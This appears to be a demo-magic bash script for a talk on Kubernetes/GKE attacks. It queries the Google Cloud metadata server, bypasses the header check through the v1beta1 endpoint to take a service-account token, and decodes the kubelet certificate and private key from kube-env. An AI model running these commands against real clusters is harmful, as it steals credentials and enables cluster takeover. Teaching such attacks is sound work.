#!/bin/bash

set -e

. demo-magic.sh
RED="\033[0;91m"
clear
echo ""
echo ""

p "${CYAN}# Try to get the token from the metadata API"
p "${RED}wget http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token${COLOR_RESET}"
wget http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token || true
echo ""
echo ""
echo ""
p "${CYAN}# Failed since we didn't set 'Metadata-Flavor: Google' header, but...."
p "${RED}wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token${COLOR_RESET}"
wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
echo ""
echo ""
echo ""
p "${CYAN}# Back to slides"
clear
echo ""
echo ""
p "${CYAN}# Grab kube-env"
p "${RED}wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json${COLOR_RESET}"
wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
echo ""
echo ""
echo ""
p ""
clear
p "${CYAN}CA_CERT${COLOR_RESET}"
wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env | grep CA_CERT | sed s'/CA_CERT: //g' | base64 -d
echo ""
echo ""
p "${CYAN}KUBELET_CERT${COLOR_RESET}"
wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env | grep KUBELET_CERT | sed s'/KUBELET_CERT: //g' | base64 -d
echo ""
echo ""
p "${CYAN}KUBELET_KEY${COLOR_RESET}"
wget -qO- http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env | grep KUBELET_KEY | sed s'/KUBELET_KEY: //g' | base64 -d
